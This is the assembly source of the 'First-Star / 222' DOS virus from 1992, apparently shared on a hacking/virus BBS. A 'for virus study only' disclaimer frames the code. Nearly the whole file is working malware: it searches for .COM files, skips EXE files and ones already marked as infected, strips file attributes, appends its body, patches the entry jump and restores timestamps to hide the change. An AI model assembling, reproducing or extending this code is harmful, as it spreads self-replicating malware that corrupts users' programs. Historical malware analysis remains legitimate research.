;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
;
;       First-Star / 222 Virus
;
;       (C) by Glenn Benton in 1992
;       This is a non-resident direct action .COM infector in current dirs.
;
;
;
                Org 0h

Start:          Jmp MainVir
                Db '*'

MainVir:        Call On1
On1:            Pop BP
                Sub BP,Offset MainVir+3
                Push Ax
                Mov Ax,Cs:OrgPrg[BP]
                Mov Bx,Cs:OrgPrg[BP]+2
                Mov Cs:Start+100h,Ax
                Mov Cs:Start[2]+100h,Bx
		Mov Ah,1ah
		Mov Dx,0fd00h
		Int 21h
		Mov Ah,4eh
Search:         Lea Dx,FileSpec[BP]
		Xor Cx,Cx
		Int 21h
                Jnc Found
                Jmp Ready
Found:          Mov Ax,4300h
                Mov Dx,0fd1eh
                Int 21h
                Push Cx
                Mov Ax,4301h
                Xor Cx,Cx
                Int 21h
                Mov Ax,3d02h
                Int 21h
                Mov Bx,5700h
                Xchg Ax,Bx
                Int 21h
                Push Cx
                Push Dx
                Mov Ah,3fh
                Lea Dx,OrgPrg[BP]
                Mov Cx,4
                Int 21h
                Mov Ax,Cs:[OrgPrg][BP]
                Cmp Ax,'MZ'
                Je ExeFile
                Cmp Ax,'ZM'
                Je ExeFile
                Mov Ah,Cs:[OrgPrg+3][BP]
                Cmp Ah,'*'
                Jne Infect
ExeFile:        Call Close
                Mov Ah,4fh
                Jmp Search
FSeek:          Xor Cx,Cx
                Xor Dx,Dx
                Int 21h
                Ret
Infect:         Mov Ax,4202h
                Call FSeek
                Sub Ax,3
                Mov Cs:CallPtr[BP]+1,Ax
                Mov Ah,40h
                Lea Dx,MainVir[BP]
                Mov Cx,VirLen
                Int 21h
                Mov Ax,4200h
                Call FSeek
                Mov Ah,40h
                Lea Dx,CallPtr[BP]
                Mov Cx,4
                Int 21h
                Call Close
Ready:          Mov Ah,1ah
                Mov Dx,80h
                Int 21h
                Pop Ax
                Mov Bx,100h
                Push Cs
                Push Bx
                Retf
Close:          Pop Si
                Pop Dx
                Pop Cx
                Mov Ax,5701h
                Int 21h
                Mov Ah,3eh
                Int 21h
                Mov Ax,4301h
                Pop Cx
                Mov Dx,0fd1eh
                Int 21h
                Push Si
                Ret

CallPtr         Db 0e9h,0,0
FileSpec	Db '*.COM',0

OrgPrg:         Int 20h
                Nop
                Nop

VirLen          Equ $-MainVir

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;
;컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴컴;
;컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;

